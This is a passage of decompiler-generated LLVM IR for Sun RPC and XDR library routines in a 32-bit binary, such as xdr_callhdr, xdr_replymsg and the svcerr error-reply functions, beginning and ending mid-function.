  store i32 %v0_8055ef3, i32* %v3_8055ef3, align 4
  br label %dec_label_pc_8055f04

dec_label_pc_8055ef8:                             ; preds = %dec_label_pc_8055e67
  %v1_8055ef8 = inttoptr i32 %tmp to i32*
  store i32 16, i32* %v1_8055ef8, align 4
  %v0_8055efe = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055efe = add i32 %v0_8055efe, 8
  %v2_8055efe = inttoptr i32 %v1_8055efe to i32*
  %v3_8055efe = load i32, i32* %v2_8055efe, align 4
  store i32 %v3_8055efe, i32* %eax.global-to-local, align 4
  %v1_8055f01 = load i32, i32* %edx.global-to-local, align 4
  %v2_8055f01 = add i32 %v1_8055f01, 4
  %v3_8055f01 = inttoptr i32 %v2_8055f01 to i32*
  store i32 %v3_8055efe, i32* %v3_8055f01, align 4
  br label %dec_label_pc_8055f04

dec_label_pc_8055f04:                             ; preds = %dec_label_pc_8055eb2, %dec_label_pc_8055eaa, %dec_label_pc_8055ea2, %dec_label_pc_8055e9a, %dec_label_pc_8055e92, %dec_label_pc_8055e8a, %dec_label_pc_8055ef3, %dec_label_pc_8055ede, %dec_label_pc_8055ed6, %dec_label_pc_8055ef8
  %v0_8055f04 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055f04 = inttoptr i32 %v0_8055f04 to i32*
  %v2_8055f04 = load i32, i32* %v1_8055f04, align 4
  store i32 %v2_8055f04, i32* %eax.global-to-local, align 4
  %v9_8055f06 = icmp eq i32 %v2_8055f04, 7
  br i1 %v9_8055f06, label %dec_label_pc_8055f22, label %dec_label_pc_8055f0b

dec_label_pc_8055f0b:                             ; preds = %dec_label_pc_8055f04
  %v9_8055f0b = icmp eq i32 %v2_8055f04, 9
  br i1 %v9_8055f0b, label %dec_label_pc_8055f29, label %dec_label_pc_8055f10

dec_label_pc_8055f10:                             ; preds = %dec_label_pc_8055f0b
  %v9_8055f10 = icmp eq i32 %v2_8055f04, 6
  %v1_8055f13 = icmp eq i1 %v9_8055f10, false
  br i1 %v1_8055f13, label %dec_label_pc_8055f35, label %dec_label_pc_8055f15

dec_label_pc_8055f15:                             ; preds = %dec_label_pc_8055f10
  %v0_8055f15 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055f15 = add i32 %v0_8055f15, 16
  %v2_8055f15 = inttoptr i32 %v1_8055f15 to i32*
  %v3_8055f15 = load i32, i32* %v2_8055f15, align 4
  store i32 %v3_8055f15, i32* %eax.global-to-local, align 4
  %v2_8055f18 = add i32 %v0_8055f04, 4
  %v3_8055f18 = inttoptr i32 %v2_8055f18 to i32*
  store i32 %v3_8055f15, i32* %v3_8055f18, align 4
  %v0_8055f1b = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055f1b = add i32 %v0_8055f1b, 20
  %v2_8055f1b = inttoptr i32 %v1_8055f1b to i32*
  %v3_8055f1b = load i32, i32* %v2_8055f1b, align 4
  store i32 %v3_8055f1b, i32* %eax.global-to-local, align 4
  %v1_8055f1e = load i32, i32* %edx.global-to-local, align 4
  %v2_8055f1e = add i32 %v1_8055f1e, 8
  %v3_8055f1e = inttoptr i32 %v2_8055f1e to i32*
  store i32 %v3_8055f1b, i32* %v3_8055f1e, align 4
  ret i32 %v3_8055f1b

dec_label_pc_8055f22:                             ; preds = %dec_label_pc_8055f04
  %v0_8055f22 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055f22 = add i32 %v0_8055f22, 16
  %v2_8055f22 = inttoptr i32 %v1_8055f22 to i32*
  %v3_8055f22 = load i32, i32* %v2_8055f22, align 4
  store i32 %v3_8055f22, i32* %eax.global-to-local, align 4
  %v2_8055f25 = add i32 %v0_8055f04, 4
  %v3_8055f25 = inttoptr i32 %v2_8055f25 to i32*
  store i32 %v3_8055f22, i32* %v3_8055f25, align 4
  ret i32 %v3_8055f22

dec_label_pc_8055f29:                             ; preds = %dec_label_pc_8055f0b
  %v0_8055f29 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055f29 = add i32 %v0_8055f29, 28
  %v2_8055f29 = inttoptr i32 %v1_8055f29 to i32*
  %v3_8055f29 = load i32, i32* %v2_8055f29, align 4
  store i32 %v3_8055f29, i32* %eax.global-to-local, align 4
  %v2_8055f2c = add i32 %v0_8055f04, 4
  %v3_8055f2c = inttoptr i32 %v2_8055f2c to i32*
  store i32 %v3_8055f29, i32* %v3_8055f2c, align 4
  %v0_8055f2f = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055f2f = add i32 %v0_8055f2f, 32
  %v2_8055f2f = inttoptr i32 %v1_8055f2f to i32*
  %v3_8055f2f = load i32, i32* %v2_8055f2f, align 4
  store i32 %v3_8055f2f, i32* %eax.global-to-local, align 4
  %v1_8055f32 = load i32, i32* %edx.global-to-local, align 4
  %v2_8055f32 = add i32 %v1_8055f32, 8
  %v3_8055f32 = inttoptr i32 %v2_8055f32 to i32*
  store i32 %v3_8055f2f, i32* %v3_8055f32, align 4
  %v0_8055f35.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055f35

dec_label_pc_8055f35:                             ; preds = %dec_label_pc_8055f10, %dec_label_pc_8055f29
  %v0_8055f35 = phi i32 [ %v2_8055f04, %dec_label_pc_8055f10 ], [ %v0_8055f35.pre, %dec_label_pc_8055f29 ]
  ret i32 %v0_8055f35

; uselistorder directives
  uselistorder i32 %v2_8055f04, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8055f04, { 1, 0, 2, 3 }
  uselistorder i32* %v1_8055ee6, { 1, 0 }
  uselistorder i32 %v1_8055e67, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp, { 8, 9, 10, 0, 1, 6, 5, 4, 3, 2, 7, 11 }
  uselistorder i32* %ecx.global-to-local, { 0, 3, 4, 1, 2, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13 }
  uselistorder label %dec_label_pc_8055f35, { 1, 0 }
  uselistorder label %dec_label_pc_8055f04, { 9, 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8055ef3, { 1, 0 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v0_8055f36 = load i32, i32* @esi, align 4
  %v0_8055f37 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 %tmp1, i32* %esi.global-to-local, align 4
  %v1_8055f43 = add i32 %arg2, 4
  %v2_8055f43 = inttoptr i32 %v1_8055f43 to i32*
  store i32 0, i32* %v2_8055f43, align 4
  %v0_8055f4a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055f4a = add i32 %v0_8055f4a, 8
  %v2_8055f4a = inttoptr i32 %v1_8055f4a to i32*
  store i32 2, i32* %v2_8055f4a, align 4
  %v0_8055f51 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055f51 = inttoptr i32 %v0_8055f51 to i32*
  %v2_8055f51 = load i32, i32* %v1_8055f51, align 4
  %v3_8055f51 = icmp eq i32 %v2_8055f51, 0
  %v1_8055f54 = icmp eq i1 %v3_8055f51, false
  br i1 %v1_8055f54, label %dec_label_pc_8055fb2, label %dec_label_pc_8055f56

dec_label_pc_8055f56:                             ; preds = %entry
  %v0_8055f58 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8055f5a = call i32 @xdr_u_long(i32* %v1_8055f51, i32 %v0_8055f58)
  %v1_8055f62 = icmp eq i32 %v3_8055f5a, 0
  br i1 %v1_8055f62, label %dec_label_pc_8055fb2, label %dec_label_pc_8055f66

dec_label_pc_8055f66:                             ; preds = %dec_label_pc_8055f56
  %v0_8055f68 = load i32, i32* @ebx, align 4
  %v1_8055f68 = add i32 %v0_8055f68, 4
  %v0_8055f6c = load i32, i32* %esi.global-to-local, align 4
  %v2_8055f6d = call i32 @xdr_enum(i32 %v0_8055f6c, i32 %v1_8055f68)
  %v1_8055f75 = icmp eq i32 %v2_8055f6d, 0
  br i1 %v1_8055f75, label %dec_label_pc_8055fb2, label %dec_label_pc_8055f79

dec_label_pc_8055f79:                             ; preds = %dec_label_pc_8055f66
  %v0_8055f7b = load i32, i32* @ebx, align 4
  %v1_8055f7b = add i32 %v0_8055f7b, 8
  store i32 %v1_8055f7b, i32* @eax, align 4
  %v0_8055f7f = load i32, i32* %esi.global-to-local, align 4
  %v2_8055f80 = inttoptr i32 %v0_8055f7f to i32*
  %v3_8055f80 = call i32 @xdr_u_long(i32* %v2_8055f80, i32 %v1_8055f7b)
  %v1_8055f88 = icmp eq i32 %v3_8055f80, 0
  br i1 %v1_8055f88, label %dec_label_pc_8055fb2, label %dec_label_pc_8055f8c

dec_label_pc_8055f8c:                             ; preds = %dec_label_pc_8055f79
  %v0_8055f8e = load i32, i32* @ebx, align 4
  %v1_8055f8e = add i32 %v0_8055f8e, 12
  store i32 %v1_8055f8e, i32* @eax, align 4
  %v0_8055f92 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055f93 = inttoptr i32 %v0_8055f92 to i32*
  %v3_8055f93 = call i32 @xdr_u_long(i32* %v2_8055f93, i32 %v1_8055f8e)
  %v1_8055f9b = icmp eq i32 %v3_8055f93, 0
  br i1 %v1_8055f9b, label %dec_label_pc_8055fb2, label %dec_label_pc_8055f9f

dec_label_pc_8055f9f:                             ; preds = %dec_label_pc_8055f8c
  %v0_8055f9f = load i32, i32* @ebx, align 4
  %v1_8055f9f = add i32 %v0_8055f9f, 16
  store i32 %v1_8055f9f, i32* @eax, align 4
  %v0_8055fa2 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8055f37, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055f36, i32* %esi.global-to-local, align 4
  %v2_8055fad = inttoptr i32 %v0_8055fa2 to i32*
  %v3_8055fad = call i32 @xdr_u_long(i32* %v2_8055fad, i32 %v1_8055f9f)
  br label %dec_label_pc_8055fb2

dec_label_pc_8055fb2:                             ; preds = %dec_label_pc_8055f8c, %dec_label_pc_8055f79, %dec_label_pc_8055f66, %dec_label_pc_8055f56, %entry, %dec_label_pc_8055f9f
  store i32 %v0_8055f37, i32* @ebx, align 4
  store i32 %v0_8055f36, i32* @esi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8055f37, { 1, 0 }
  uselistorder i32 %v0_8055f36, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8055fb2, { 5, 0, 1, 2, 3, 4 }
}

define i32 @__GI_xdr_rejected_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8055fb8 = load i32, i32* @esi, align 4
  %v0_8055fb9 = load i32, i32* @ebx, align 4
  store i32 %v0_8055fb9, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  %v2_8055fc7 = call i32 @xdr_enum(i32 %arg1, i32 %tmp3)
  %v1_8055fcf = icmp eq i32 %v2_8055fc7, 0
  br i1 %v1_8055fcf, label %dec_label_pc_8056017, label %dec_label_pc_8055fd3

dec_label_pc_8055fd3:                             ; preds = %entry
  %v0_8055fd3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055fd3 = inttoptr i32 %v0_8055fd3 to i32*
  %v2_8055fd3 = load i32, i32* %v1_8055fd3, align 4
  %v1_8055fd5 = icmp eq i32 %v2_8055fd3, 0
  br i1 %v1_8055fd5, label %dec_label_pc_8055fde, label %dec_label_pc_8055fd9

dec_label_pc_8055fd9:                             ; preds = %dec_label_pc_8055fd3
  %v8_8055fd9 = icmp eq i32 %v2_8055fd3, 1
  %v1_8055fda = icmp eq i1 %v8_8055fd9, false
  br i1 %v1_8055fda, label %dec_label_pc_8056017, label %dec_label_pc_8055fd9.dec_label_pc_8056004_crit_edge

dec_label_pc_8055fd9.dec_label_pc_8056004_crit_edge: ; preds = %dec_label_pc_8055fd9
  br label %dec_label_pc_8056004

dec_label_pc_8055fde:                             ; preds = %dec_label_pc_8055fd3
  %v1_8055fe0 = add i32 %v0_8055fd3, 4
  store i32 %v1_8055fe0, i32* @eax, align 4
  %v0_8055fe4 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055fe5 = inttoptr i32 %v0_8055fe4 to i32*
  %v3_8055fe5 = call i32 @xdr_u_long(i32* %v2_8055fe5, i32 %v1_8055fe0)
  %v1_8055fed = icmp eq i32 %v3_8055fe5, 0
  br i1 %v1_8055fed, label %dec_label_pc_8056017, label %dec_label_pc_8055ff1

dec_label_pc_8055ff1:                             ; preds = %dec_label_pc_8055fde
  %v0_8055ff1 = load i32, i32* @ebx, align 4
  %v1_8055ff1 = add i32 %v0_8055ff1, 8
  store i32 %v1_8055ff1, i32* @eax, align 4
  %v0_8055ff4 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055ffd = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055ffd, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055fb8, i32* %esi.global-to-local, align 4
  %v2_8055fff = inttoptr i32 %v0_8055ff4 to i32*
  %v3_8055fff = call i32 @xdr_u_long(i32* %v2_8055fff, i32 %v1_8055ff1)
  %v0_8056004.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056004

dec_label_pc_8056004:                             ; preds = %dec_label_pc_8055fd9.dec_label_pc_8056004_crit_edge, %dec_label_pc_8055ff1
  %v0_8056004 = phi i32 [ %v0_8055fd3, %dec_label_pc_8055fd9.dec_label_pc_8056004_crit_edge ], [ %v0_8056004.pre, %dec_label_pc_8055ff1 ]
  %v1_8056004 = add i32 %v0_8056004, 4
  %v0_8056007 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056010 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056010, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055fb8, i32* %esi.global-to-local, align 4
  %v2_8056012 = call i32 @xdr_enum(i32 %v0_8056007, i32 %v1_8056004)
  br label %dec_label_pc_8056017

dec_label_pc_8056017:                             ; preds = %dec_label_pc_8055fde, %dec_label_pc_8055fd9, %entry, %dec_label_pc_8056004
  %v2_805601a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805601a, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055fb8, i32* %esi.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8055fb8, { 2, 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056017, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8056004, { 1, 0 }
}

define i32 @__GI_xdr_replymsg() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v0_805601d = load i32, i32* @esi, align 4
  store i32 %tmp2, i32* @esi, align 4
  %v2_805602c = inttoptr i32 %tmp2 to i32*
  %v3_805602c = call i32 @xdr_u_long(i32* %v2_805602c, i32 %tmp)
  %v1_8056034 = icmp eq i32 %v3_805602c, 0
  br i1 %v1_8056034, label %dec_label_pc_805606e, label %dec_label_pc_8056038

dec_label_pc_8056038:                             ; preds = %entry
  %v0_8056038 = load i32, i32* @ebx, align 4
  %v1_8056038 = add i32 %v0_8056038, 4
  %v0_805603e = load i32, i32* @esi, align 4
  %v2_805603f = call i32 @xdr_enum(i32 %v0_805603e, i32 %v1_8056038)
  %v1_8056047 = icmp eq i32 %v2_805603f, 0
  br i1 %v1_8056047, label %dec_label_pc_805606e, label %dec_label_pc_805604b

dec_label_pc_805604b:                             ; preds = %dec_label_pc_8056038
  %v0_805604b = load i32, i32* @ebx, align 4
  %v1_805604b = add i32 %v0_805604b, 4
  %v2_805604b = inttoptr i32 %v1_805604b to i32*
  %v3_805604b = load i32, i32* %v2_805604b, align 4
  %v12_805604b = icmp eq i32 %v3_805604b, 1
  %v1_805604f = icmp eq i1 %v12_805604b, false
  br i1 %v1_805604f, label %dec_label_pc_805606e, label %dec_label_pc_8056051

dec_label_pc_8056051:                             ; preds = %dec_label_pc_805604b
  %v1_8056054 = add i32 %v0_805604b, 12
  %v1_805605f = add i32 %v0_805604b, 8
  %v0_8056063 = load i32, i32* @esi, align 4
  %v5_8056064 = inttoptr i32 %v1_805605f to i32*
  %v6_8056064 = call i32 @xdr_union(i32 %v0_8056063, i32* %v5_8056064, i32 %v1_8056054, i32 ptrtoint (i32* @global_var_805cb40.308 to i32), i32 0)
  br label %dec_label_pc_8056070

dec_label_pc_805606e:                             ; preds = %dec_label_pc_805604b, %dec_label_pc_8056038, %entry
  br label %dec_label_pc_8056070

dec_label_pc_8056070:                             ; preds = %dec_label_pc_8056051, %dec_label_pc_805606e
  %v0_8056073 = phi i32 [ %v6_8056064, %dec_label_pc_8056051 ], [ 0, %dec_label_pc_805606e ]
  store i32 %v0_805601d, i32* @esi, align 4
  ret i32 %v0_8056073

; uselistorder directives
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder label %dec_label_pc_8056070, { 1, 0 }
}

define i32 @xdr_des_block(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8056081 = call i32 @xdr_opaque(i32 %arg1, i32 %arg2, i32 8)
  ret i32 %v3_8056081
}

define i32 @xdr_opaque_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_805608a = load i32, i32* @esi, align 4
  %v0_805608b = load i32, i32* @ebx, align 4
  store i32 %v0_805608b, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v2_8056099 = call i32 @xdr_enum(i32 %arg1, i32 %arg2)
  %v1_80560a3 = icmp eq i32 %v2_8056099, 0
  br i1 %v1_80560a3, label %dec_label_pc_80560bf, label %dec_label_pc_80560a7

dec_label_pc_80560a7:                             ; preds = %entry
  %v0_80560a7 = load i32, i32* @ebx, align 4
  %v1_80560a7 = add i32 %v0_80560a7, 8
  %v1_80560b0 = add i32 %v0_80560a7, 4
  %v0_80560b4 = load i32, i32* @esi, align 4
  %v4_80560b5 = inttoptr i32 %v0_80560b4 to i32*
  %v5_80560b5 = call i32 @xdr_bytes(i32* %v4_80560b5, i32 %v1_80560b0, i32 %v1_80560a7, i32 400)
  br label %dec_label_pc_80560bf

dec_label_pc_80560bf:                             ; preds = %entry, %dec_label_pc_80560a7
  %v0_80560bf = phi i32 [ 0, %entry ], [ %v5_80560b5, %dec_label_pc_80560a7 ]
  %v2_80560c2 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80560c2, i32* @ebx, align 4
  store i32 %v0_805608a, i32* @esi, align 4
  ret i32 %v0_80560bf

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80560bf, { 1, 0 }
}

define i32 @__GI_xdr_accepted_reply(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80560c5 = load i32, i32* @esi, align 4
  %v0_80560c6 = load i32, i32* @ebx, align 4
  store i32 %v0_80560c6, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v2_80560d4 = call i32 @xdr_opaque_auth(i32 %arg1, i32 %arg2)
  %v1_80560dc = icmp eq i32 %v2_80560d4, 0
  br i1 %v1_80560dc, label %dec_label_pc_805613f, label %dec_label_pc_80560e0

dec_label_pc_80560e0:                             ; preds = %entry
  %v0_80560e2 = load i32, i32* @ebx, align 4
  %v1_80560e2 = add i32 %v0_80560e2, 12
  %v0_80560e6 = load i32, i32* @esi, align 4
  %v2_80560e7 = call i32 @xdr_enum(i32 %v0_80560e6, i32 %v1_80560e2)
  %v1_80560ef = icmp eq i32 %v2_80560e7, 0
  br i1 %v1_80560ef, label %dec_label_pc_805613f, label %dec_label_pc_80560f3

dec_label_pc_80560f3:                             ; preds = %dec_label_pc_80560e0
  %v0_80560f3 = load i32, i32* @ebx, align 4
  %v1_80560f3 = add i32 %v0_80560f3, 12
  %v2_80560f3 = inttoptr i32 %v1_80560f3 to i32*
  %v3_80560f3 = load i32, i32* %v2_80560f3, align 4
  %v1_80560f6 = icmp eq i32 %v3_80560f3, 0
  br i1 %v1_80560f6, label %dec_label_pc_8056106, label %dec_label_pc_80560fa

dec_label_pc_80560fa:                             ; preds = %dec_label_pc_80560f3
  %v9_80560ff = icmp eq i32 %v3_80560f3, 2
  %v1_8056102 = icmp eq i1 %v9_80560ff, false
  br i1 %v1_8056102, label %dec_label_pc_8056141, label %dec_label_pc_8056119

dec_label_pc_8056106:                             ; preds = %dec_label_pc_80560f3
  %v1_8056111 = add i32 %v0_80560f3, 20
  %v2_8056111 = inttoptr i32 %v1_8056111 to i32*
  %v3_8056111 = load i32, i32* %v2_8056111, align 4
  %v2_8056115 = load i32, i32* %stack_var_-8, align 4
  store i32 %v0_80560c5, i32* @esi, align 4
  call void @__pseudo_branch(i32 %v3_8056111)
  br label %dec_label_pc_8056119

dec_label_pc_8056119:                             ; preds = %dec_label_pc_80560fa, %dec_label_pc_8056106
  %v0_805611b = phi i32 [ %v0_80560f3, %dec_label_pc_80560fa ], [ %v2_8056115, %dec_label_pc_8056106 ]
  %v1_805611b = add i32 %v0_805611b, 16
  store i32 %v1_805611b, i32* @eax, align 4
  %v0_805611f = load i32, i32* @esi, align 4
  %v2_8056120 = inttoptr i32 %v0_805611f to i32*
  %v3_8056120 = call i32 @xdr_u_long(i32* %v2_8056120, i32 %v1_805611b)
  %v1_8056128 = icmp eq i32 %v3_8056120, 0
  br i1 %v1_8056128, label %dec_label_pc_805613f, label %dec_label_pc_805612c

dec_label_pc_805612c:                             ; preds = %dec_label_pc_8056119
  %v0_805612c = load i32, i32* @ebx, align 4
  %v1_805612c = add i32 %v0_805612c, 20
  %v0_805612f = load i32, i32* @esi, align 4
  %v2_8056137 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056137, i32* @eax, align 4
  %v2_805613a = inttoptr i32 %v0_805612f to i32*
  %v3_805613a = call i32 @xdr_u_long(i32* %v2_805613a, i32 %v1_805612c)
  br label %dec_label_pc_805613f

dec_label_pc_805613f:                             ; preds = %dec_label_pc_8056119, %dec_label_pc_80560e0, %entry, %dec_label_pc_805612c
  br label %dec_label_pc_8056141

dec_label_pc_8056141:                             ; preds = %dec_label_pc_80560fa, %dec_label_pc_805613f
  %v0_8056144 = phi i32 [ 1, %dec_label_pc_80560fa ], [ 0, %dec_label_pc_805613f ]
  ret i32 %v0_8056144

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056141, { 1, 0 }
  uselistorder label %dec_label_pc_805613f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8056119, { 1, 0 }
}

define i32 @svc_sendreply(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8056164 = add i32 %arg1, 32
  %v3_805616c = bitcast i32* %stack_var_-40 to i16*
  %v4_805616c = call i32 @memcpy(i16* %v3_805616c, i32 %v1_8056164, i32 12)
  %v1_805618b = add i32 %arg1, 8
  %v2_805618b = inttoptr i32 %v1_805618b to i32*
  %v3_805618b = load i32, i32* %v2_805618b, align 4
  %v2_805618e = ptrtoint i32* %stack_var_-52 to i32
  %v5_8056194 = add i32 %v3_805618b, 12
  %v6_8056194 = inttoptr i32 %v5_8056194 to i32*
  %v7_8056194 = load i32, i32* %v6_8056194, align 4
  call void @__pseudo_call(i32 %v7_8056194)
  ret i32 %v2_805618e
}

define i32 @svcerr_noproc(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_80561b8 = add i32 %arg1, 32
  %v3_80561c0 = bitcast i32* %stack_var_-40 to i16*
  %v4_80561c0 = call i32 @memcpy(i16* %v3_80561c0, i32 %v1_80561b8, i32 12)
  %v1_80561cf = add i32 %arg1, 8
  %v2_80561cf = inttoptr i32 %v1_80561cf to i32*
  %v3_80561cf = load i32, i32* %v2_80561cf, align 4
  %v2_80561d2 = ptrtoint i32* %stack_var_-52 to i32
  %v5_80561d8 = add i32 %v3_80561cf, 12
  %v6_80561d8 = inttoptr i32 %v5_80561d8 to i32*
  %v7_80561d8 = load i32, i32* %v6_80561d8, align 4
  call void @__pseudo_call(i32 %v7_80561d8)
  ret i32 %v2_80561d2
}

define i32 @svcerr_decode(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_80561fc = add i32 %arg1, 32
  %v3_8056204 = bitcast i32* %stack_var_-40 to i16*
  %v4_8056204 = call i32 @memcpy(i16* %v3_8056204, i32 %v1_80561fc, i32 12)
  %v1_8056213 = add i32 %arg1, 8
  %v2_8056213 = inttoptr i32 %v1_8056213 to i32*
  %v3_8056213 = load i32, i32* %v2_8056213, align 4
  %v2_8056216 = ptrtoint i32* %stack_var_-52 to i32
  %v5_805621c = add i32 %v3_8056213, 12
  %v6_805621c = inttoptr i32 %v5_805621c to i32*
  %v7_805621c = load i32, i32* %v6_805621c, align 4
  call void @__pseudo_call(i32 %v7_805621c)
  ret i32 %v2_8056216
}

define i32 @svcerr_systemerr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8056240 = add i32 %arg1, 32
  %v3_8056248 = bitcast i32* %stack_var_-40 to i16*
  %v4_8056248 = call i32 @memcpy(i16* %v3_8056248, i32 %v1_8056240, i32 12)
  %v1_8056257 = add i32 %arg1, 8
  %v2_8056257 = inttoptr i32 %v1_8056257 to i32*
  %v3_8056257 = load i32, i32* %v2_8056257, align 4
  %v2_805625a = ptrtoint i32* %stack_var_-52 to i32
  %v5_8056260 = add i32 %v3_8056257, 12
  %v6_8056260 = inttoptr i32 %v5_8056260 to i32*
  %v7_8056260 = load i32, i32* %v6_8056260, align 4
  call void @__pseudo_call(i32 %v7_8056260)
  ret i32 %v2_805625a
}

define i32 @svcerr_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_805628f = add i32 %arg1, 8
  %v2_805628f = inttoptr i32 %v1_805628f to i32*
  %v3_805628f = load i32, i32* %v2_805628f, align 4
  store i32 %v3_805628f, i32* @edx, align 4
  %v2_8056292 = ptrtoint i32* %stack_var_-48 to i32
  %v5_8056298 = add i32 %v3_805628f, 12
  %v6_8056298 = inttoptr i32 %v5_8056298 to i32*
  %v7_8056298 = load i32, i32* %v6_8056298, align 4
  call void @__pseudo_call(i32 %v7_8056298)
  ret i32 %v2_8056292

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_weakauth(i32 %arg1) local_unnamed_addr {
entry:
  %v2_80562a8 = call i32 @svcerr_auth(i32 %arg1, i32 5)
  ret i32 %v2_80562a8
}

define i32 @__GI_svcerr_noprog() local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_80562cd = add i32 %tmp3, 32
  %v3_80562d5 = bitcast i32* %stack_var_-40 to i16*
  %v4_80562d5 = call i32 @memcpy(i16* %v3_80562d5, i32 %v1_80562cd, i32 12)
  %v1_80562e4 = add i32 %tmp3, 8
  %v2_80562e4 = inttoptr i32 %v1_80562e4 to i32*
  %v3_80562e4 = load i32, i32* %v2_80562e4, align 4
  store i32 %v3_80562e4, i32* @edx, align 4
  %v2_80562e7 = ptrtoint i32* %stack_var_-52 to i32
  %v5_80562ed = add i32 %v3_80562e4, 12
  %v6_80562ed = inttoptr i32 %v5_80562ed to i32*
  %v7_80562ed = load i32, i32* %v6_80562ed, align 4
  call void @__pseudo_call(i32 %v7_80562ed)
  ret i32 %v2_80562e7
}

define i32 @svcerr_progvers() local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8056311 = add i32 %tmp7, 32
  %v3_8056319 = bitcast i32* %stack_var_-40 to i16*
  %v4_8056319 = call i32 @memcpy(i16* %v3_8056319, i32 %v1_8056311, i32 12)
  %v1_8056338 = add i32 %tmp7, 8
  %v2_8056338 = inttoptr i32 %v1_8056338 to i32*
  %v3_8056338 = load i32, i32* %v2_8056338, align 4
  store i32 %v3_8056338, i32* @edx, align 4
  %v2_805633b = ptrtoint i32* %stack_var_-52 to i32
  %v5_8056341 = add i32 %v3_8056338, 12
  %v6_8056341 = inttoptr i32 %v5_8056341 to i32*
  %v7_8056341 = load i32, i32* %v6_8056341, align 4
  call void @__pseudo_call(i32 %v7_8056341)
  ret i32 %v2_805633b
}

define i32 @svc_find(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
